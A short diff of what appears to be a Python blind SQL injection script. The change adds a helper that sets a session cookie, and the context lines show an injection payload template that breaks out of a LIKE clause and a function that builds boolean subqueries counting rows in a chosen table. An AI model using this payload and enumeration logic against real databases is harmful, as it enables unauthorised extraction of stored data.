@@ -14,6 +14,11 @@ targetString = "카카오"
 baseQuery = "aaaa%' and {} and 'a%'='a"
 
 
+def set_cookies(new_cookies):
+    global cookies
+    cookies["JSESSIONID"] = new_cookies
+
+
 def get_count(column, table):
     countQuery = (
         "(SELECT COUNT(" + column + ") AS total_usernames FROM " + table + ") > "
